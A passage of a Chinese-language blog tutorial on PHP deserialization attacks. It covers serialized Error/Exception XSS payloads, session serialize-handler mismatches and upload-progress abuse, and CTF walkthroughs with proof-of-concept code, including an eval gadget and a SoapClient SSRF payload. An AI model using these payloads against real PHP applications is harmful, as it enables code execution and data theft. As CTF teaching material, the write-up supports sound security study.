<p>XSS<br>&#x5F00;&#x542F;&#x62A5;&#x9519;&#x7684;&#x60C5;&#x51B5;&#x4E0B;:<br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$a = <span class="hljs-keyword">new</span> Error(<span class="hljs-string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="hljs-keyword">echo</span> urlencode($b);</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//Test</span></span><br><span class="line">$t = urldecode(<span class="hljs-string">&apos;O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D&apos;</span>);</span><br><span class="line">$c = unserialize($t);</span><br><span class="line"><span class="hljs-keyword">echo</span> $c;</span><br></pre></td></tr></tbody></table></figure><p></p>
<h3 id="Exception-XSS"><a href="#Exception-XSS" class="headerlink" title="Exception XSS"></a>Exception XSS</h3><p>@l3m0n &#x5E08;&#x5085;blog&#x4E2D;&#x63D0;&#x5230;&#x4E86;XSS</p>
<p>Exception<br>&#x9002;&#x7528;&#x4E8E;php5&#x3001;7&#x7248;&#x672C;</p>
<p>XSS<br>&#x5F00;&#x542F;&#x62A5;&#x9519;&#x7684;&#x60C5;&#x51B5;&#x4E0B;:<br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$a = <span class="hljs-keyword">new</span> <span class="hljs-keyword">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="hljs-keyword">echo</span> urlencode($b);</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//Test</span></span><br><span class="line">$c = urldecode(<span class="hljs-string">&apos;O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D&apos;</span>);</span><br><span class="line"><span class="hljs-keyword">echo</span> unserialize($c);</span><br></pre></td></tr></tbody></table></figure><p></p>
<h3 id="&#x591A;&#x79CD;&#x59FF;&#x52BF;&#x7EC4;&#x5408;&#x62F3;"><a href="#&#x591A;&#x79CD;&#x59FF;&#x52BF;&#x7EC4;&#x5408;&#x62F3;" class="headerlink" title="&#x591A;&#x79CD;&#x59FF;&#x52BF;&#x7EC4;&#x5408;&#x62F3;"></a>&#x591A;&#x79CD;&#x59FF;&#x52BF;&#x7EC4;&#x5408;&#x62F3;</h3><p>&#x4F8B;&#x5B50;&#x53EF;&#x89C1;:Pornhub&#x67D0;&#x6F0F;&#x6D1E; &#xFF1A; <a href="https://5haked.blogspot.com/2016/10/how-i-hacked-pornhub-for-fun-and-profit.html?m=1" target="_blank" rel="noopener">https://5haked.blogspot.com/2016/10/how-i-hacked-pornhub-for-fun-and-profit.html?m=1</a></p>
<p>&#x6D89;&#x53CA;&#x59FF;&#x52BF;&#x5982;&#x4E0B;<br>&#x53EF;&#x83B7;&#x53D6;&#x76EE;&#x5F55;&#xFF1A; DirectoryIterator<br>XXE&#xFF1A; SimpleXMLElement<br>&#x521B;&#x5EFA;&#x7A7A;&#x767D;&#x6587;&#x4EF6;&#xFF1A; SQLite3</p>
<h2 id="&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x9003;&#x9038;"><a href="#&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x9003;&#x9038;" class="headerlink" title="&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x9003;&#x9038;"></a>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x9003;&#x9038;</h2><p>&#x539F;&#x7406;: &#x5BF9;&#x7C7B;&#x4E2D;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x5C5E;&#x6027;&#x4E5F;&#x4F1A;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x3002;&#x4E14;PHP &#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#xFF0C;&#x5E95;&#x5C42;&#x4EE3;&#x7801;&#x662F;&#x4EE5; <code>;</code>&#x4F5C;&#x4E3A;&#x5B57;&#x6BB5;&#x7684;&#x5206;&#x9694;&#xFF0C;&#x4EE5; <code>}</code>&#x4F5C;&#x4E3A;&#x7ED3;&#x5C3E;(&#x5B57;&#x7B26;&#x4E32;&#x9664;&#x5916;)&#xFF0C;&#x5E76;&#x4E14;&#x662F;&#x6839;&#x636E;&#x957F;&#x5EA6;&#x5224;&#x65AD;&#x5185;&#x5BB9;&#x7684;</p>
<p>&#x5229;&#x7528;: &#x6784;&#x9020;&#x5B57;&#x7B26;&#x4E32;</p>
<h3 id="&#x4F8B;&#x5B50;&#x4E00;"><a href="#&#x4F8B;&#x5B50;&#x4E00;" class="headerlink" title="&#x4F8B;&#x5B50;&#x4E00;"></a>&#x4F8B;&#x5B50;&#x4E00;</h3><p>0ctf2016 &#x4E00;&#x9053;web&#x9898;</p>
<h3 id="&#x4F8B;&#x5B50;&#x4E8C;"><a href="#&#x4F8B;&#x5B50;&#x4E8C;" class="headerlink" title="&#x4F8B;&#x5B50;&#x4E8C;"></a>&#x4F8B;&#x5B50;&#x4E8C;</h3><p>&#x5B89;&#x6D35;&#x676F; - easy_serialize_php<br><a href="https://xz.aliyun.com/t/6911#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/6911#toc-3</a></p>
<h2 id="Session-&#x53CD;&#x5E8F;&#x5217;&#x5316;"><a href="#Session-&#x53CD;&#x5E8F;&#x5217;&#x5316;" class="headerlink" title="Session &#x53CD;&#x5E8F;&#x5217;&#x5316;"></a>Session &#x53CD;&#x5E8F;&#x5217;&#x5316;</h2><h3 id="&#x53C2;&#x6570;&#x76F8;&#x5173;"><a href="#&#x53C2;&#x6570;&#x76F8;&#x5173;" class="headerlink" title="&#x53C2;&#x6570;&#x76F8;&#x5173;"></a>&#x53C2;&#x6570;&#x76F8;&#x5173;</h3><p>session&#x76F8;&#x5173;&#x53C2;&#x6570;&#x914D;&#x7F6E;</p>
<table>
<thead>
<tr>
<th align="center">Directive</th>
<th align="center">&#x542B;&#x4E49;</th>
</tr>
</thead>
<tbody><tr>
<td align="center">session.save_handler</td>
<td align="center">session&#x4FDD;&#x5B58;&#x5F62;&#x5F0F;&#x3002;&#x9ED8;&#x8BA4;&#x4E3A;files</td>
</tr>
<tr>
<td align="center">session.save_path</td>
<td align="center">&#x8BBE;&#x7F6E;session&#x7684;&#x5B58;&#x50A8;&#x8DEF;&#x5F84;,&#x9ED8;&#x8BA4;&#x5728;/tmp</td>
</tr>
<tr>
<td align="center">session.serialize_handler</td>
<td align="center">session&#x5E8F;&#x5217;&#x5316;&#x5B58;&#x50A8;&#x6240;&#x7528;&#x5904;&#x7406;&#x5668;&#x3002;&#x9ED8;&#x8BA4;&#x4E3A;php&#x3002;</td>
</tr>
<tr>
<td align="center">session.upload_progress.cleanup</td>
<td align="center">&#x4E00;&#x65E6;&#x8BFB;&#x53D6;&#x4E86;&#x6240;&#x6709;POST&#x6570;&#x636E;&#xFF0C;&#x7ACB;&#x5373;&#x6E05;&#x9664;&#x8FDB;&#x5EA6;&#x4FE1;&#x606F;&#x3002;&#x9ED8;&#x8BA4;&#x5F00;&#x542F;</td>
</tr>
<tr>
<td align="center">session.upload_progress.enabled</td>
<td align="center">&#x5C06;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x7684;&#x8FDB;&#x5EA6;&#x4FE1;&#x606F;&#x5B58;&#x5728;session&#x4E2D;&#x3002;&#x9ED8;&#x8BA4;&#x5F00;&#x542F;&#x3002;</td>
</tr>
</tbody></table>
<p>PHP&#x5904;&#x7406;&#x5668;&#x4E09;&#x79CD;&#x5E8F;&#x5217;&#x5316;&#x65B9;&#x5F0F;</p>
<table>
<thead>
<tr>
<th align="center">&#x5904;&#x7406;&#x5668;</th>
<th align="center">&#x5BF9;&#x5E94;&#x7684;&#x5B58;&#x50A8;&#x683C;&#x5F0F;</th>
</tr>
</thead>
<tbody><tr>
<td align="center">php_binary</td>
<td align="center">&#x952E;&#x540D;&#x7684;&#x957F;&#x5EA6;&#x5BF9;&#x5E94;&#x7684;ASCII&#x5B57;&#x7B26;&#xFF0B;&#x952E;&#x540D;&#xFF0B;&#x7ECF;&#x8FC7;serialize() &#x51FD;&#x6570;&#x53CD;&#x5E8F;&#x5217;&#x5904;&#x7406;&#x7684;&#x503C;</td>
</tr>
<tr>
<td align="center">php</td>
<td align="center">&#x952E;&#x540D;&#xFF0B;&#x7AD6;&#x7EBF;&#xFF0B;&#x7ECF;&#x8FC7;serialize()&#x51FD;&#x6570;&#x53CD;&#x5E8F;&#x5217;&#x5904;&#x7406;&#x7684;&#x503C;</td>
</tr>
<tr>
<td align="center">php_serialize</td>
<td align="center">serialize()&#x51FD;&#x6570;&#x53CD;&#x5E8F;&#x5217;&#x5904;&#x7406;&#x6570;&#x7EC4;&#x65B9;&#x5F0F;</td>
</tr>
</tbody></table>
<h3 id="&#x5DEE;&#x5F02;&#x6027;"><a href="#&#x5DEE;&#x5F02;&#x6027;" class="headerlink" title="&#x5DEE;&#x5F02;&#x6027;"></a>&#x5DEE;&#x5F02;&#x6027;</h3><p>PHP&#x5904;&#x7406;&#x5668;&#x5DEE;&#x5F02;&#x6027;&#x5982;&#x4E0B;<br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="hljs-string">&apos;session.serialize_handler&apos;</span>,<span class="hljs-string">&apos;&apos;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="hljs-string">&apos;name&apos;</span>] = $_GET[<span class="hljs-string">&apos;name&apos;</span>];</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>URL&#x4F20;&#x53C2;&#xFF0C;<code>?name=P2hm1n</code>&#x3002;session&#x4EE5;&#x6587;&#x672C;&#x5B58;&#x50A8;&#x65B9;&#x5F0F;&#x4FDD;&#x5B58;&#x5728; <code>/tmp</code> &#x76EE;&#x5F55;&#x4E0B;&#x3002;<p></p>
<p>php: <code>name|s:6:&quot;P2hm1n&quot;;</code><br>php_binary: <code>&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;names:6:&quot;P2hm1n&quot;;</code><br>php_serialize: <code>a:1:{s:4:&quot;name&quot;;s:6:&quot;P2hm1n&quot;;}</code></p>
<p>&#x6F0F;&#x6D1E;&#x6838;&#x5FC3;&#x4E5F;&#x4F53;&#x73B0;&#x5728; <strong>&#x5DEE;&#x5F02;&#x6027;</strong> &#x4E09;&#x4E2A;&#x5B57;</p>
<p>Q: &#x4EC0;&#x4E48;&#x662F;&#x5DEE;&#x5F02;&#x6027;:<br>A: &#x9009;&#x62E9;&#x7684;&#x5904;&#x7406;&#x65B9;&#x5F0F;&#x4E0D;&#x540C;&#xFF0C;&#x5E8F;&#x5217;&#x5316;&#x548C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x65B9;&#x5F0F;&#x4EA6;&#x4E0D;&#x540C;&#x3002;&#x5982;&#x679C;&#x7F51;&#x7AD9;&#x5E8F;&#x5217;&#x5316;&#x5E76;&#x5B58;&#x50A8;Session&#x4E0E;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5E76;&#x8BFB;&#x53D6;Session&#x7684;&#x65B9;&#x5F0F;&#x4E0D;&#x540C;&#xFF0C;&#x5C31;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x6F0F;&#x6D1E;&#x7684;&#x4EA7;&#x751F;&#x3002;</p>
<h3 id="&#x653B;&#x51FB;&#x624B;&#x6BB5;"><a href="#&#x653B;&#x51FB;&#x624B;&#x6BB5;" class="headerlink" title="&#x653B;&#x51FB;&#x624B;&#x6BB5;"></a>&#x653B;&#x51FB;&#x624B;&#x6BB5;</h3><h4 id="trick-1"><a href="#trick-1" class="headerlink" title="trick-1"></a>trick-1</h4><p>&#x5229;&#x7528;&#x524D;&#x63D0;: &#x811A;&#x672C;&#x4E2D;&#x8BBE;&#x7F6E;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x5904;&#x7406;&#x5668;&#x4E0E;php.ini&#x8BBE;&#x7F6E;&#x7684;&#x4E0D;&#x540C;</p>
<p>&#x5E38;&#x89C1;&#x6F0F;&#x6D1E;&#x573A;&#x666F;: <code>php_serilize</code> &#x65B9;&#x5F0F;&#x5B58;&#x5165;&#xFF0C;&#x89E3;&#x6790;&#x53C8;&#x662F;&#x7528;&#x7684; <code>php</code> &#x5904;&#x7406;&#x5668;</p>
<p>&#x5229;&#x7528;&#x539F;&#x7406;&#xFF1A; php &#x5728;&#x83B7;&#x53D6; session &#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x6309;&#x7167;<code>session.serialize_handler=php</code> &#x89C4;&#x5219;&#x6765;&#x5904;&#x7406; session &#x6587;&#x4EF6;&#x3002;&#x628A; <code>|</code> &#x524D;&#x9762;&#x7684;&#x503C;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;session&#x952E;&#x540D;&#xFF0C;&#x5BF9; <code>|</code> &#x540E;&#x9762;&#x5C31;&#x4F1A;&#x8FDB;&#x884C;&#x4E00;&#x4E2A;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x64CD;&#x4F5C;</p>
<h4 id="trick-2"><a href="#trick-2" class="headerlink" title="trick-2"></a>trick-2</h4><p>&#x914D;&#x7F6E;&#x4E0D;&#x5F53;&#x53EF;&#x9020;&#x6210;session&#x88AB;&#x63A7;&#x3002;</p>
<p>&#x5F53;<code>session.upload_progress.enabled</code>&#x6253;&#x5F00;&#x65F6;&#xFF0C;php&#x4F1A;&#x8BB0;&#x5F55;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x7684;&#x8FDB;&#x5EA6;&#xFF0C;&#x5728;&#x4E0A;&#x4F20;&#x65F6;&#x4F1A;&#x5C06;&#x5176;&#x4FE1;&#x606F;&#x4FDD;&#x5B58;&#x5728;<code>$_SESSION</code>&#x4E2D;&#x3002;</p>
<p>&#x4F46;&#x5F53;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x65F6;&#xFF0C;&#x540C;&#x65F6;POST&#x4E00;&#x4E2A;&#x4E0E;php.ini&#x4E2D;<code>session.upload_progress.name</code>&#x540C;&#x540D;&#x7684;&#x53D8;&#x91CF;&#x65F6;(<code>session.upload_progress.name</code>&#x7684;&#x53D8;&#x91CF;&#x503C;&#x9ED8;&#x8BA4;&#x4E3A;<code>PHP_SESSION_UPLOAD_PROGRESS</code>&#xFF09;&#xFF0C;PHP&#x68C0;&#x6D4B;&#x5230;&#x8FD9;&#x79CD;&#x540C;&#x540D;&#x8BF7;&#x6C42;&#x4F1A;&#x5728;<code>$_SESSION</code>&#x4E2D;&#x6DFB;&#x52A0;&#x4E00;&#x6761;&#x6570;&#x636E;&#x3002;&#x6211;&#x4EEC;&#x7531;&#x6B64;&#x6765;&#x8BBE;&#x7F6E;session&#x3002;</p>
<p><code>session.upload_progress.cleanup</code>&#x5173;&#x95ED;&#x3002;&#x8FD9;&#x5C31; &#x6781;&#x5927;&#x63D0;&#x9AD8;&#x4E86;&#x6F0F;&#x6D1E;&#x7684;&#x5229;&#x7528;&#x6210;&#x529F;&#x7387;&#x3002;&#x5982;&#x679C;&#x6B64;&#x9009;&#x9879;<code>session.upload_progress.cleanup</code>&#x6253;&#x5F00;&#xFF0C;&#x90A3;&#x4E48;&#x5728;&#x5229;&#x7528;&#x65F6;&#x653B;&#x51FB;&#x8005;&#x9700;&#x8981;&#x4E0A;&#x4F20;large and crash&#x6587;&#x4EF6;&#xFF0C;&#x6765;&#x4F7F;&#x5F97;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;data&#x5F97;&#x4EE5;&#x6267;&#x884C;&#x3002;</p>
<p>&#x8BE6;&#x60C5;&#x89C1;<a href="https://bugs.php.net/bug.php?id=71101" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=71101</a></p>
<h3 id="&#x4F8B;&#x5B50;&#x4E00;-1"><a href="#&#x4F8B;&#x5B50;&#x4E00;-1" class="headerlink" title="&#x4F8B;&#x5B50;&#x4E00;"></a>&#x4F8B;&#x5B50;&#x4E00;</h3><p>&#x9898;&#x76EE;&#x94FE;&#x63A5;: <a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/index.php</a> </p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="hljs-string">&apos;session.serialize_handler&apos;</span>, <span class="hljs-string">&apos;php&apos;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $mdzz;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;mdzz = <span class="hljs-string">&apos;phpinfo();&apos;</span>;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&apos;phpinfo&apos;</span>]))</span><br><span class="line">{</span><br><span class="line">    $m = <span class="hljs-keyword">new</span> OowoO();</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">else</span></span><br><span class="line">{</span><br><span class="line">    highlight_string(file_get_contents(<span class="hljs-string">&apos;index.php&apos;</span>));</span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5DEE;&#x5F02;&#x70B9;:</p>
<ol>
<li>phpinfo&#x4E2D; <code>session.serialize_handler = php_serialize</code>&#x3002;</li>
<li>&#x9898;&#x76EE;&#x4E2D; <code>ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</code></li>
</ol>
<p>&#x6838;&#x5FC3;&#x76EE;&#x7684;: &#x8FDB;&#x5165; <code>eval</code> &#x51FD;&#x6570;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x3002;&#x7531;&#x4E8E;&#x9898;&#x76EE;&#x4E2D;&#x5E76;&#x6CA1;&#x6709;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x64CD;&#x4F5C;&#xFF0C;&#x5176;&#x4E2D; <code>$this-&gt;mdzz</code> &#x4E0D;&#x53EF;&#x901A;&#x8FC7;&#x5E38;&#x89C4;&#x624B;&#x6BB5;&#x63A7;&#x5236;&#x3002;</p>
<p>&#x89C2;&#x5BDF;phpinfo&#x4E2D;session&#x5176;&#x4ED6;&#x6709;&#x5173;&#x4FE1;&#x606F;<br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201620913.png" alt></p>
<p>&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x4E0A;&#x4F20;&#x7684;&#x9875;&#x9762;<br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">&lt;form action=<span class="hljs-string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="hljs-string">&quot;change&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6784;&#x9020;poc</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class OowoO</span><br><span class="line">{</span><br><span class="line">    public $mdzz;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$a = new OowoO();</span><br><span class="line">$a-&gt;mdzz = &quot;payload&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x626B;&#x63CF;&#x76EE;&#x5F55;<br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201629436.png" alt></p>
<p>phpinfo&#x4E2D;&#x7684;<code>_SERVER[&quot;SCRIPT_FILENAME&quot;]</code>&#x5B57;&#x6BB5;&#x5F97;&#x5230;&#x8DEF;&#x5F84;&#xFF1A;<code>/opt/lampp/htdocs/</code>&#x3002;</p>
<p>&#x968F;&#x540E;&#x7528;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;<br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201637025.png" alt></p>
<h3 id="&#x4F8B;&#x5B50;&#x4E8C;-1"><a href="#&#x4F8B;&#x5B50;&#x4E8C;-1" class="headerlink" title="&#x4F8B;&#x5B50;&#x4E8C;"></a>&#x4F8B;&#x5B50;&#x4E8C;</h3><p>&#x9898;&#x76EE;&#x6765;&#x6E90;: LCTF2018-bestphp&#x2019;s revenge </p>
<p>&#x9898;&#x76EE;&#x7ED9;&#x4E86;&#x4E24;&#x4E2A;&#x6E90;&#x7801;</p>
<p>index.php</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="hljs-string">&apos;implode&apos;</span>;</span><br><span class="line">call_user_func($_GET[f],$_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[name])){</span><br><span class="line">    $_SESSION[name] = $_GET[name];</span><br><span class="line">}</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="hljs-keyword">array</span>(reset($_SESSION),<span class="hljs-string">&apos;welcome_to_the_lctf2018&apos;</span>);</span><br><span class="line">call_user_func($b,$a);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>flag.php</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;only localhost can get flag!&apos;</span>;</span><br><span class="line">$flag = <span class="hljs-string">&apos;LCTF{*************************}&apos;</span>;</span><br><span class="line"><span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>){</span><br><span class="line">       $_SESSION[<span class="hljs-string">&apos;flag&apos;</span>] = $flag;</span><br><span class="line">   }</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>flag.php &#x8DDF; index.php &#x4E4B;&#x95F4;&#x7684;&#x5FAE;&#x5999;&#x8054;&#x7CFB;&#x4F53;&#x73B0;&#x5728;<br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">$_SESSION[<span class="hljs-string">&apos;flag&apos;</span>] = $flag;</span><br><span class="line">var_dump($_SESSION);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><code>$_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;</code>&#x3002;&#x8FD9;&#x91CC;&#x81EA;&#x7136;&#x60F3;&#x5230;SSRF&#x3002;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x4E0A;&#x6587;&#x63D0;&#x5230;&#x7684;php&#x539F;&#x751F;&#x7C7B;SoapClient&#x4E2D;&#x7684;<code>__call</code>&#x65B9;&#x6CD5;&#x8FDB;&#x884C;SSRF&#x3002;</p>
<p>&#x6784;&#x9020;SSRF&#x7684;POC (POC&#x6765;&#x81EA; @Smi1e)</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$url = <span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">$b = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&apos;uri&apos;</span> =&gt; $url, <span class="hljs-string">&apos;location&apos;</span> =&gt; $url));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(<span class="hljs-string">&apos;^^&apos;</span>, <span class="hljs-string">&quot;\r\n&quot;</span>, $a);</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;|&quot;</span> . urlencode($a);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>index.php &#x4E2D;&#x6D89;&#x53CA;&#x5230;&#x4E86;<code>call_user_func</code> &#x51FD;&#x6570;&#x3002;PHP&#x624B;&#x518C;&#x4E2D; &#x7ED9;&#x4E86;&#x51E0;&#x4E2A;<code>call_user_func</code> &#x51FD;&#x6570;&#x7684;&#x4F8B;&#x5B50;: <a href="https://www.php.net/manual/zh/function.call-user-func.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.call-user-func.php</a><br>&#x5176;&#x4E2D;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#x5F53;&#x6211;&#x4EEC;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x4E3A;&#x6570;&#x7EC4;&#x65F6;&#xFF0C;&#x4F1A;&#x628A;&#x7B2C;&#x4E00;&#x4E2A;&#x503C;&#x5F53;&#x4F5C;&#x7C7B;&#x540D;&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x503C;&#x5F53;&#x4F5C;&#x65B9;&#x6CD5;&#x8FDB;&#x884C;&#x56DE;&#x8C03;<br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201649416.png" alt="image-20201113201649416"></p>
